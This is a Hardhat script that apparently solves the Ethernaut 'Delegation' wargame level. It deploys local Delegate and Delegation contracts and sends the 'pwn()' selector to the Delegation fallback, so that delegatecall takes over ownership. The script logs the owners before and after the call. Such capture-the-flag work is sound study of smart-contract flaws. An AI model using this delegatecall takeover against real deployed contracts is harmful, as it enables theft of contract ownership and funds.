const { Signer } = require("ethers");
const { toUtf8Bytes } = require("ethers/lib/utils");
const { ethers } = require("hardhat");

// const CONTRACT_ADDRESS = "0x440C0fCDC317D69606eabc35C0F676D1a8251Ee1"; // get from browser console
const PLAYER_ADDRESS = "0x23618e81E3f5cdF7f54C3d65f7FBc0aBf5B21E8f"; // change to your own address

async function main() {
    const singer = await ethers.getSigner(PLAYER_ADDRESS);
    const delegateFactory = await ethers.getContractFactory("Delegate")
    const delegationFactory = await ethers.getContractFactory("Delegation")
    const signer0 = await ethers.getSigner()
    const address0 = await signer0.getAddress()

    const delegate = await delegateFactory.deploy(address0) // set owner to signer0
    console.log(`address 0: ${address0}`)
    console.log(delegate.address)
    await delegate.deployed()
    const delegation = await delegationFactory.deploy(delegate.address)
    console.log(delegation.address)
    await delegation.deployed()

    const owner0 = await delegate.owner();
    console.log(`now the owner of Delegate is ${owner0}`);
    const owner1 = await delegation.owner();
    console.log(`now the owner of Delegation is ${owner1}`);
    console.log("--------------------------------");

    const selector = ethers.utils
        .keccak256(toUtf8Bytes("pwn()"))
        .substring(0, 10);
    console.log(selector);

    const tx = {
        from: PLAYER_ADDRESS,
        to: delegation.address,
        data: selector,
    };

    // await (web3.eth.sendTransaction)(tx)

    // singer.checkTransaction(tx)

    const transaction = await singer.sendTransaction(tx);
    // receipt = await transaction.wait(1)
    // console.log(receipt)

    const owner2 = await delegate.owner();
    console.log(`now the owner of Delegate is ${owner2}`);
    const owner3 = await delegation.owner();
    console.log(`now the owner of Delegation is ${owner3}`);
}

main().catch((error) => {
    console.error(error);
    // eslint-disable-next-line no-process-exit
    process.exit(1);
});
